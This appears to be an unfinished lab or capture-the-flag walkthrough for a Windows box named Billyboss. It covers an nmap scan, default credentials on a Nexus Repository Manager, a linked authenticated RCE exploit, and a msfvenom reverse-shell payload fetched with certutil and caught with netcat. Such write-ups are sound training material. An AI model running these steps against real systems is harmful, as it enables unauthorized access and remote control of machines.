# Billyboss (WIP)

## Nmap

```
sudo nmap 192.168.64.61 -p- -sS -sV                

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
80/tcp   open  http    Microsoft IIS httpd 10.0
8081/tcp open  http    Jetty 9.4.18.v20190429
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

On port 8081 we have Sonar Nexus Repository manager running on version 3.21.0.05.

![http://192.168.64.61:8081/](<../../.gitbook/assets/image (854).png>)

Guessing the sign in credentials of nexus:nexus gives access to Nexus. Searching for exploits shows an authenticated RCE on exploit-db.com

{% embed url="https://www.exploit-db.com/exploits/49385" %}

First I created a reverse shell with msfvenom to connect on port 21. `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.64 LPORT=21 -f exe > /home/kali/windows/shell.exe`

Then set a Python SimpleHTTPServer on my attacking machine to host the shell. After doing so I edited the exploit code to include the credentials we have and to execute cmd.exe and certutil.exe to download the reverse shell from my attacking machine.

![](<../../.gitbook/assets/image (855).png>)

After doing this and confirming from my attacking machine that the shell was downloaded I then edited the exploit code to call cmd.exe again and execute the shell.

![](<../../.gitbook/assets/image (856).png>)

In which we receive. a shell back on our `netcat` listener.

![](<../../.gitbook/assets/image (858).png>)

